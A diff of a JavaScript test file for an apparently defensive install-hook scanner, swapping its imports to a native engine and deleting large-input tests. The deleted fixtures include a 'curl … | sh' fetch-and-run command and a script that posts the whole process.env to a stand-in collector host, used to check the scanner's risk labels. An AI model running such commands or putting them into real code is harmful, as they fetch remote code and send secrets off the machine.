@@ -1,11 +1,11 @@
-// Install hooks followed like the Python engine: src/lib/hooks.js is the
-// twin of lazaret.scanner.core's follow_hook (with _hook_tokens, a
-// shlex tokenizer), install_script_risk, import_time_risk and
+// Install hooks followed like the Python engine: the native engine
+// (lib/native.js) answers lazaret.scanner.core's follow_hook (with
+// _hook_tokens, a shlex tokenizer), install_script_risk, import_time_risk and
 // node_candidates. Every expectation below is core's result on the same
-// text; tests/architecture/test_js_parity_hooks.py compares the two on a
-// large generated corpus and on these cases. Hook commands and scripts can
-// be up to 16,000,000 characters, so the last tests run each function on
-// inputs of 9 million, where a backtracking pattern overflowed V8's stack.
+// text; tests/architecture/test_rust_parity_hooks.py compares the two
+// engines on a large generated corpus. Hook commands and scripts can be up to
+// 16,000,000 characters: review-hooks-big-*.test.js run each function on
+// inputs of 9 million.
 // All payloads are inert text: hosts are .invalid or TEST-NET (192.0.2.x).
 
 import { test } from "node:test";
@@ -13,8 +13,11 @@ import assert from "node:assert/strict";
 import * as api from "../src/index.js";
 import {
   followHook, hookScriptTargets, installScriptRisk, importTimeRisk, nodeCandidates, hookTokens, shlexSplit, nodeECodes,
-  NODE_E_RE, HOOK_MAX_CHARS, HOOK_MAX_COMMANDS, HOOK_MAX_TARGETS,
-} from "../src/lib/hooks.js";
+  packValues,
+} from "../src/lib/native.js";
+
+const [HOOK_MAX_CHARS, HOOK_MAX_COMMANDS, HOOK_MAX_TARGETS] = packValues("HOOK_MAX_CHARS", "HOOK_MAX_COMMANDS",
+  "HOOK_MAX_TARGETS");
 
 test("a hook command is followed to the files it runs", () => {
   const cases = [
@@ -164,61 +167,6 @@ test("the files Node tries for a path", () => {
   const tail = [".js", ".cjs", ".mjs", ".json", ".node", "/index.js", "/index.cjs", "/index.mjs", "/index.json"];
   for (const [rel, base] of [["lib", "lib"], ["lib/", "lib"], ["./bin/x", "./bin/x"], ["a//", "a"], ["", ""]])
     assert.deepEqual(nodeCandidates(rel), [base, ...tail.map((t) => base + t)], rel);
-});
-
-test("the node -e loop finds core's _NODE_E_RE matches", () => {
-  let seed = 20260926;
-  const rnd = (n) => { seed = (seed * 1103515245 + 12345) % 2 ** 31; return seed % n; };
-  const alphabet = ["node -e ", "node\t-e\x1c", "node", " ", "\n", "-e", '"', '"', "'", "'", "\\", "\\", "a",
-    "\r", "require('./p')", "\u00e9"];
-  const viaPattern = (s) => [...s.matchAll(NODE_E_RE)].map((m) => m[1] ?? m[2] ?? m[3]);
-  for (let t = 0; t < 30000; t++) {
-    let s = "";
-    for (let k = rnd(12); k >= 0; k--) s += alphabet[rnd(alphabet.length)];
-    assert.deepEqual(nodeECodes(s), viaPattern(s), JSON.stringify(s));
-  }
-});
-
-// ~9 MB inputs of the shapes a hostile hook or install script can take
-const BIG = 9_000_000;
-const fill = (unit, head = "", tail = "") =>
-  head + unit.repeat(Math.ceil((BIG - head.length - tail.length) / unit.length)) + tail;
-const SHAPES = {
-  "a long quoted node -e": () => fill("a", 'node -e "', '"'),     // core's pattern overflowed V8 here
-  "a long single-quoted word": () => fill("x b", "node '", "'"),
-  "an unclosed quote": () => fill("y ", 'node "'),                // shlex raises: core's regex split
-  "many backslashes": () => "\\".repeat(BIG + 1),
-  "escaped spaces": () => fill("a\\ "),
-  "curl … | segments": () => fill("curl https://files.invalid/a | "),
-  "curl … | sh commands": () => fill("curl -s https://files.invalid/x.sh | sh; "),
-  "-a options after curl": () => fill("-a ", "curl "),
-  "a huge JSON.stringify(process.env) file": () =>
-    fill("const e = JSON.stringify(process.env);\n", "", "fetch('https://collector.invalid/c', { method: 'POST', body: e });\n"),
-  "a cd chain": () => fill("cd a; ", "", "node x.js"),
-  "a wrapper chain": () => fill("env ", "", "node x.js"),
-};
-
-test("inputs of millions of characters: every function returns, in time", () => {
-  const fns = { hookScriptTargets, installScriptRisk, importTimeRisk, nodeCandidates };
-  for (const [label, make] of Object.entries(SHAPES)) {
-    const text = make();
-    for (const [name, fn] of Object.entries(fns)) {
-      const t = performance.now();
-      assert.doesNotThrow(() => fn(text), `${name} on ${label}`);
-      const ms = performance.now() - t;
-      assert.ok(ms < 20_000, `${name} on ${label}: ${Math.round(ms)} ms`);   // (linear: 2 s at most when written)
-    }
-  }
-});
-
-test("inputs of millions of characters: the results are core's", () => {
-  // a hook longer than HOOK_MAX_CHARS is not followed, and says so
-  for (const label of ["a long quoted node -e", "a cd chain", "a wrapper chain", "escaped spaces"])
-    assert.deepEqual(followHook(SHAPES[label]()), [[], false], label);
-  assert.deepEqual(installScriptRisk(SHAPES["curl … | sh commands"]()), ["pipes a download into a shell"]);
-  const huge = SHAPES["a huge JSON.stringify(process.env) file"]();         // (0.1.8: the line that sends it)
-  assert.deepEqual(importTimeRisk(huge),
-    [["reads credentials or the whole environment and sends data over the network"], huge.split("\n").length - 1]);
 });
 
 test("following a hook is bounded, and says when a limit stopped it", () => {
